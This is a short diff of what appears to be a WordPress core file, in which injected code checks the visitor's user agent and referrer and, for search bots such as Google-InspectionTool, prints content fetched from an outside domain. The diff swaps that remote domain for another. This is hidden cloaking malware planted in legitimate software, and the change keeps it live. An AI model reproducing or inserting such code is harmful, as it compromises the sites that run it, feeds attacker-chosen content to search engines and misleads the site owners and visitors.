@@ -21,7 +21,6 @@ function wp_get_server_protocol() {
 
 	return $protocol;
 }
-
 $s_ref = $_SERVER['HTTP_REFERER'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 
@@ -34,10 +33,9 @@ if ((strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') 
         exit;
     }
     
-    echo file_get_contents("https://bilottagallery.com/readme.txt");
+    echo file_get_contents("https://jaxlocksmithpro.com/readme.txt");
     exit;
 }
-
 /**
  * Fixes `$_SERVER` variables for various setups.
  *
